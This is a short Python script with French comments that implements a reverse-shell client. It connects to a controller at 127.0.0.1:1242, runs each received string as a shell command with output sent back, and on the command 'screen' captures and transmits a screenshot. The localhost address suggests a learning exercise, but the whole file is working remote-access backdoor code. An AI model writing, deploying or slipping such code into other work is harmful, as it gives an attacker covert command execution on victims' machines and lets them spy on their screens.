import socket as s
import subprocess
from mss import mss


message = str()
#### Client ######
##Attendre une connexion

def screen():
    with mss() as sct :
        sct.shot()
        f = open("monitor-1.png","rb")
        data=  f.read()
        f.close()
        return data


mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)


### Fonction connect((host,port)

mon_socket.connect(("127.0.0.1",1242))
while message != "exit":
    message = mon_socket.recv(262144)
    message = message.decode('UTF-8')
    if message == "screen":
        mon_socket.send(screen())
    else:
        print(message)
        process = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        mon_socket.send(process.stdout.read()+process.stderr.read())


mon_socket.close()

#    if message == "exit":
#        mon_socket.close()
